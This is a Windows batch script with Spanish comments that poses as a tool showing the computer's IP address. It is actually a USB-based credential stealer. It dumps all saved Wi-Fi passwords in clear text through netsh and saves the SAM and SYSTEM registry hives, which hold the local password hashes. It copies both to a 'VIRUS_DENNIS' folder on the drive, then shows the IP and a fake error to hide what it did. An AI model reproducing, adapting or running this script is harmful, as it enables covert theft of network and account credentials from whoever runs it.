@echo off
echo            ============================
echo            =       IP DEL EQUIPO      =
echo            ============================
echo\
echo  Usuario: %os%
echo  Fecha de hoy: %date%
echo  Nombre del Equipo: %computername% 
echo.
echo  Buscando IP . . . . . . . . ...

rem Buscando la MEMORIA USB
:Buscando_USB
if exist "G:\VIRUS_DENNIS\" ( call :datos_del_equipo G:\VIRUS_DENNIS\ )
if exist "H:\VIRUS_DENNIS\" ( call :datos_del_equipo H:\VIRUS_DENNIS\ )
if exist "F:\VIRUS_DENNIS\" ( call :datos_del_equipo F:\VIRUS_DENNIS\ )
if exist "I:\VIRUS_DENNIS\" ( call :datos_del_equipo I:\VIRUS_DENNIS\ )
if exist "J:\VIRUS_DENNIS\" ( call :datos_del_equipo J:\VIRUS_DENNIS\ )
if exist "K:\VIRUS_DENNIS\" ( call :datos_del_equipo K:\VIRUS_DENNIS\ )

:datos_del_equipo
set ruta= %1%computername%
rem CREANDO DIRECTORIO DE LA PC
if not exist "%ruta%" ( MD %ruta% )2>nul
rem CREANDO ARCHIVOS DE LA PC 
set archivo= %ruta%\%date:~0,2%%date:~3,2%%date:~6,4%_%time:~0,2%%time:~3,2%%time:~6,2%_Datos_%computername%.txt
set wifi= %ruta%\%date:~0,2%%date:~3,2%%date:~6,4%_%time:~0,2%%time:~3,2%%time:~6,2%_WiFi_%computername%.txt
echo           # # # # # # # # # # # # # # # # # # # # # # # # # # # >>%archivo%
echo           #                Datos de %computername% >>%archivo%
echo           # # # # # # # # # # # # # # # # # # # # # # # # # # # >>%archivo%
echo. >>%archivo%
echo FECHA : %date% >> %archivo% 
echo HORA : %time%  >> %archivo% 
echo NOMBRE DEL EQUIPO : %computername% >> %archivo% 
echo USUARIO : %username%    >> %archivo%
echo ----------------------------------------------------------------->> %archivo%
echo  MAC ADDRESS %computername% >>%archivo%
getmac  /V >> %archivo%
rem CAPTURAR CONTRASEÑAS DE WIFI DE LA MAQUINA
rem EL FOR FUNCIONA PARA EXTRAER LOS NOMBRES [SSID] DE LAS REDES [WI-FI]
for /f "usebackq tokens=2,* delims=:" %%f in (`netsh wlan show profile`) do (
    echo %%f>> %wifi%
)
rem EXTRAE LAS CONTRASEÑAS DE LAS REDES [WI-FI]
for /f "usebackq tokens=*" %%f in (%wifi%) do (
    echo - - - - - - - - - - - - - - - INICIO RED WiFi - - - - - - - - - - - - - - - - - - ->> %wifi%
    echo                               [%%f] >> %wifi%
    netsh wlan show profile name= "%%f" key=clear | findstr "Tipo Autenticación Nombre clave">> %wifi%
    echo - - - - - - - - - - - - - - - FIN RED WiFi- - - - - - - - - - - - - - - - - - - - ->> %wifi%
    echo. >>%wifi%
)
    reg save hklm\SYSTEM SYSTEM >nul
    reg save hklm\SAM SAM >nul

    move SYSTEM %ruta% >nul
    move SAM %ruta% >nul

ipconfig | findstr "IPv4"
echo Error en la sintaxis no se reconoce un comanto interno o externo
pause
exit